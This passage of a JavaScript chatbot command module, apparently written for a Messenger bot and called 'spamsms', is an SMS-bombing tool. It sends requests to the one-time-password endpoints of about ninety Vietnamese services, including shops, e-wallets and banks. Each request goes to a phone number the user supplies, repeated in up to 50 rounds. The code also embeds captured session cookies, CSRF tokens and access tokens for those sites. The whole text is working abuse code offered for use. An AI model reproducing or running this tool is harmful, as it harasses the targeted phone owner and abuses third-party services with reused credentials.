			'_cabinet_key': 'SFMyNTY.g3QAAAACbQAAABBvdHBfbG9naW5fcGFzc2VkZAAFZmFsc2VtAAAABXBob25lbQAAAAs4NDM5NTI3MTQwMg._Opxk3aYQEWoonHoIgUhbhOxUx_9BtdySPUqwzWA9C0',
		};
		const params = {
			'phone': phone,
			'amount': '2000000',
			'term': '7',
			'utm_source': 'pop_up',
			'utm_medium': 'organic',
			'utm_campaign': 'direct_takomo',
			'utm_content': 'mainpage_popup_login',
		};
		await axios.get('https://lk.takomo.vn/', { params, headers: {
			'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9',
			'referer': 'https://takomo.vn/',
			'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
		}, withCredentials: true });
		
		const headers2 = {
			'accept': 'application/json, text/plain, */*',
			'content-type': 'application/json;charset=UTF-8',
			'origin': 'https://lk.takomo.vn',
			'referer': `https://lk.takomo.vn/?phone=${phone}&amount=2000000&term=7`,
			'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
		};
		const jsonData = {
			data: {
				phone: phone,
				code: 'resend',
				channel: 'ivr',
			},
		};
		await axios.post('https://lk.takomo.vn/api/4/client/otp/send', jsonData, { headers: headers2, withCredentials: true });
	} catch (e) {}
}

// Helper function để tạo tên ngẫu nhiên
function generateRandomName() {
	const lastNames = ['Bố', 'Là', 'HAI', 'Anh', 'cụ', 'của'];
	const middleNames = ['viết', 'tool', 'khá', 'bá', 'HOANG', 'NGUYEN'];
	const firstNames = ['HAI', 'ANH', 'D', '4', 'G', 'T'];
	
	const lastName = lastNames[Math.floor(Math.random() * lastNames.length)];
	const middleName = Math.random() > 0.5 ? middleNames[Math.floor(Math.random() * middleNames.length)] : '';
	const firstName = firstNames[Math.floor(Math.random() * firstNames.length)];
	
	return `${lastName} ${middleName} ${firstName}`.trim();
}

// Danh sách tất cả các hàm OTP - theo đúng thứ tự trong file Python
const allOTPFunctions = [
	sendOTP_Sapo,
	sendOTP_Viettel,
	sendOTP_Medicare,
	sendOTP_TV360,
	sendOTP_DienMayXanh,
	sendOTP_KingFoodMart,
	sendOTP_Mocha,
	sendOTP_FPTPlay,
	sendOTP_FPTPlay_Reset,
	sendOTP_Vieon,
	sendOTP_GHN,
	sendOTP_LotteMart,
	sendOTP_VayVND,
	sendOTP_Shopee,
	sendOTP_TheGioiDiDong,
	sendOTP_FPTShop,
	sendOTP_WinMart,
	sendOTP_VietLoan,
	sendOTP_Lozi,
	sendOTP_F88,
	sendOTP_Vinpearl,
	sendOTP_Traveloka,
	sendOTP_DongPlus,
	sendOTP_Tiki,
	sendOTP_Lazada,
	sendOTP_VNPay,
	sendOTP_VinID,
	sendOTP_Momo,
	sendOTP_ZaloPay,
	sendOTP_Bidv,
	sendOTP_Vietcombank,
	sendOTP_Techcombank,
	sendOTP_Grab,
	sendOTP_Be,
	sendOTP_GoViet,
	sendOTP_Now,
	sendOTP_Baemin,
	sendOTP_ShopFood,
	sendOTP_Foody,
	sendOTP_PasGo,
	sendOTP_Takomo,
	sendOTP_Medicare_V2,
	sendOTP_BeautyBox,
	sendOTP_ViettelPost,
	sendOTP_Lozi_V2,
	sendOTP_Vinpearl_V2,
	sendOTP_ViettelMoney,
	sendOTP_XanhSM_SMS,
	sendOTP_XanhSM_Zalo,
	sendOTP_Popeyes,
	sendOTP_Ahamove,
	sendOTP_FMComVN,
	sendOTP_Dominos,
	sendOTP_Viettel_V2,
	sendOTP_Viettel_V3,
	sendOTP_TokyoLife,
	sendOTP_30Shine,
	sendOTP_CathayLife,
	sendOTP_BatDongSan,
	sendOTP_Gumac,
	sendOTP_MutosiRegister,
	sendOTP_MutosiResetPassword,
	sendOTP_VietAir,
	sendOTP_Fahasa,
	sendOTP_Shopiness,
	sendOTP_Mocha35,
	sendOTP_Bibabo,
	sendOTP_Moca,
	sendOTP_FPTPlay_ForgotPass,
	sendOTP_NhaThuocLongChau,
	sendOTP_NhaThuocLongChau_Type1,
	sendOTP_GalaxyPlay,
	sendOTP_EmartMall,
	sendOTP_MyViettel2,
	sendOTP_ViettelRegister,
	sendOTP_Watsons,
	sendOTP_HoangPhuc,
	sendOTP_Pantio,
	sendOTP_Routine,
	sendOTP_VayVND_Full,
	sendOTP_Tima,
	sendOTP_Paynet,
	sendOTP_MoneyGo,
	sendOTP_Pico,
	sendOTP_PNJ,
	sendOTP_TiniWorld,
	sendOTP_TakomoV2,
	sendOTP_Futabus,
	sendOTP_Quizizz,
	sendOTP_VietLoan_V2,
	sendOTP_Vinamilk_V2,
];

async function sendOTP_Futabus(phone) {
	try {
		const headers = {
			'accept': 'application/json',
			'accept-language': 'vi,en-US;q=0.9,en;q=0.8',
			'content-type': 'application/json',
			'origin': 'https://futabus.vn',
			'referer': 'https://futabus.vn/',
			'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
			'x-access-token': 'eyJhbGciOiJSUzI1NiIsImtpZCI6IjBjYjQyNzQyYWU1OGY0ZGE0NjdiY2RhZWE0Yjk1YTI5ZmJhMGM1ZjkiLCJ0eXAiOiJKV1QifQ.eyJhbm9ueW1vdXMiOnRydWUsImlwIjoiOjoxIiwidXNlcl9hZ2VudCI6Ik1vemlsbGEvNS4wIChXaW5kb3dzIE5UIDEwLjA7IFdpbjY0OyB4NjQpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS8xMTQuMC4wLjAgU2FmYXJpLzUzNy4zNiIsImlzcyI6Imh0dHBzOi8vc2VjdXJldG9rZW4uZ29vZ2xlLmNvbS9mYWNlY2FyLTI5YWU3IiwiYXVkIjoiZmFjZWNhci0yOWFlNyIsImF1dGhfdGltZSI6MTcyMjQyNDU2MywidXNlcl9pZCI6InNFMkk1dkg3TTBhUkhWdVl1QW9QaXByczZKZTIiLCJzdWIiOiJzRTJJNXZIN00wYVJIVnVZdUFvUGlwcnM2SmUyIiwiaWF0IjoxNzIyNDI0NTYzLCJleHAiOjE3MjI0MjgxNjMsImZpcmViYXNlIjp7ImlkZW50aXRpZXMiOnt9LCJzaWduX2luX3Byb3ZpZGVyIjoiY3VzdG9tIn19.nP7jES3RVs4QgGnUoJKXml9KS7ZjOwuMlSaRklAjA7Kp8bKGmJRJFCLb1bX_am-nXovNAQ9mZ_68k7BII6SEahctrppOqeubMO-rtOfS8zOGd0_9_fWi9DBIEjEjuNJYhd55USesLwVtb5zd3fg5qjbC-QZAKo4J-V61HQvQEIBEe2EDSqDKGdtsZZ7ph33Kl5vGcpINGH-yt-2gkFAmyaoft6PpjjcS7wC_RpRkGi_bwUxG6JNXQUyBZq82T84JuqdolplXABMxd1gSBLNeBazriCAGYLsRexuvFHoet7VvEnlSm3Gnlf1oTIuR0nm1qRPsOA5W-RbZzu45fSv5jQ',
			'x-app-id': 'client',
		};
		const jsonData = {
			phoneNumber: phone,
			deviceId: 'd46a74f1-09b9-4db6-b022-aaa9d87e11ed',
			use_for: 'LOGIN',
		};
		await axios.post('https://api.vato.vn/api/authenticate/request_code', jsonData, { headers });
	} catch (e) {}
}

async function sendOTP_Quizizz(phone) {
	try {
		const headers = {
			'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
			'Accept-Language': 'vi,en-US;q=0.9,en;q=0.8',
			'Content-Type': 'application/x-www-form-urlencoded',
			'Origin': 'null',
			'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
		};
		const data = new URLSearchParams({
			'FormRegister.FullName': 'Nguyễn Quang Ngọc',
			'FormRegister.Phone': phone,
			'FormRegister.Password': 'BEAUTYBOX12a@',
			'FormRegister.ConfirmPassword': 'BEAUTYBOX12a@',
			'ConfirmOtpType': 'Register',
			'FormRegister.IsRegisterFromPhone': 'true',
			'__RequestVerificationToken': 'CfDJ8ASZJlA33dJMoWx8wnezdv8kQF_TsFhcp3PSmVMgL4cFBdDdGs-g35Tm7OsyC3m_0Z1euQaHjJ12RKwIZ9W6nZ9ByBew4Qn49WIN8i8UecSrnHXhWprzW9hpRmOi4k_f5WQbgXyA9h0bgipkYiJjfoc',
		});
		await axios.post('https://id.viettelpost.vn/Account/SendOTPByPhone', data, { headers });
	} catch (e) {}
}

async function sendOTP_VietLoan_V2(phone) {
	try {
		const cookies = {
			'_fbp': 'fb.1.1720102725444.358598086701375218',
			'_gcl_au': '1.1.619229570.1720102726',
			'mousestats_vi': 'acaa606972ae539932c0',
			'_tt_enable_cookie': '1',
			'_ttp': 'tGf0fClVBAWb7n4wsYwyYbdPx5W',
			'_ym_uid': '1720102728534641572',
			'_ym_d': '1720102728',
			'_gid': 'GA1.2.557208002.1720622172',
			'XSRF-TOKEN': 'eyJpdiI6IjJUcUxmYUFZY3ZGR3hFVFFGS2QybkE9PSIsInZhbHVlIjoidWVYSDZTZmVKOWZ0MFVrQnJ0VHFMOUZEdkcvUXZtQzBsTUhPRXg2Z0FWejV0U3grbzVHUUl6TG13Z09PWjhMQURWN0pkRFl4bzI3Nm9nQTdFUm5HTjN2TFd2NkExTlQ5RjUwZ1hGZEpDaUFDUTkxRVpwRzdTdWhoVElNRVYvbzgiLCJtYWMiOiI0ZTU0MWY5ZDI2NGI3MmU3ZGQwMDIzMjNiYjJjZDUyZjIzNjdkZjc0ODFhNWVkMTdhZWQ0NTJiNDgxY2ZkMDczIiwidGFnIjoiIn0%3D',
			'sessionid': 'eyJpdiI6InBWUDRIMVE1bUNtTk5CN0htRk4yQVE9PSIsInZhbHVlIjoiMGJwSU1VOER4ZnNlSCt1L0Vjckp0akliMWZYd1lXaU01K08ybXRYOWtpb2theFdzSzBENnVzWUdmczFQNzN1YU53Uk1hUk1lZWVYM25sQ0ZwbytEQldGcCthdUR4S29sVHI3SVRKcEZHRndobTlKcWx2QVlCejJPclc1dkU1bmciLCJtYWMiOiJiOTliN2NkNmY5ZDFkNTZlN2VhODg3NWIxMmEzZmVlNzRmZjU1ZGFmZWYxMzI0ZWYwNDNmMWZmMDljNmMzZDdhIiwidGFnIjoiIn0%3D',
		};
		const headers = {
			'accept': '*/*',
			'accept-language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
			'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
			'origin': 'https://vietloan.vn',
			'referer': 'https://vietloan.vn/register',
			'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
			'x-requested-with': 'XMLHttpRequest',
		};
		const data = new URLSearchParams({
			'phone': phone,
			'_token': '0fgGIpezZElNb6On3gIr9jwFGxdY64YGrF8bAeNU',
		});
		await axios.post('https://vietloan.vn/register/phone-resend', data, { headers, withCredentials: true });
	} catch (e) {}
}

async function sendOTP_Vinamilk_V2(phone) {
	try {
		const headers = {
			'accept': '*/*',
			'accept-language': 'vi,en-US;q=0.9,en;q=0.8',
			'authorization': 'Bearer null',
			'content-type': 'text/plain;charset=UTF-8',
			'origin': 'https://new.vinamilk.com.vn',
			'referer': 'https://new.vinamilk.com.vn/account/register',
			'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
		};
		const data = `{"type":"register","phone":"${phone}"}`;
		await axios.post('https://new.vinamilk.com.vn/api/account/getotp', data, { headers });
	} catch (e) {}
}

// Hàm chính để spam SMS
async function spamSMS(phone, iteration) {
	const promises = allOTPFunctions.map(fn => 
		fn(phone).catch(() => {}) // Bỏ qua lỗi
	);
	
	await Promise.all(promises);
	
	return `Đã gửi OTP lần ${iteration}`;
}

module.exports.run = async function({ api, event, args }) {
	try {
		const { threadID, messageID } = event;
		
		if (args.length < 2) {
			return api.sendMessage(
				"⚠️ Thiếu tham số!\n" +
				"📌 Cú pháp: spamsms [số điện thoại] [số lần]\n" +
				"📝 Ví dụ: spamsms 0123456789 5",
				threadID,
				messageID
			);
		}
		
		const phone = args[0].replace(/^0/, '84'); // Chuyển 0xxx thành 84xxx
		const count = parseInt(args[1]) || 1;
		
		if (isNaN(count) || count < 1 || count > 50) {
			return api.sendMessage(
				"❌ Số lần spam phải từ 1 đến 50!",
				threadID,
				messageID
			);
		}
		
		await api.sendMessage(
			`🚀 Bắt đầu spam SMS đến số: ${phone}\n` +
			`📊 Số lần: ${count}\n` +
			`⏳ Vui lòng chờ...`,
			threadID,
			messageID
		);
		
		for (let i = 1; i <= count; i++) {
			const result = await spamSMS(phone, i);
			
			if (i % 5 === 0 || i === count) {
				await api.sendMessage(
					`✅ Đã hoàn thành: ${i}/${count} lần`,
					threadID
				);
			}
			
			// Đợi 4 giây giữa mỗi lần spam
			if (i < count) {
				await new Promise(resolve => setTimeout(resolve, 4000));
			}
		}
		
		return api.sendMessage(
			`✅ Hoàn thành spam SMS!\n` +
			`📱 Số điện thoại: ${phone}\n` +
			`📊 Tổng số lần: ${count}`,
			threadID,
			messageID
		);
		
	} catch (error) {
		console.error('Error in spamsms:', error);
		return api.sendMessage(
			`❌ Đã xảy ra lỗi: ${error.message}`,
			event.threadID,
			event.messageID
		);
	}
};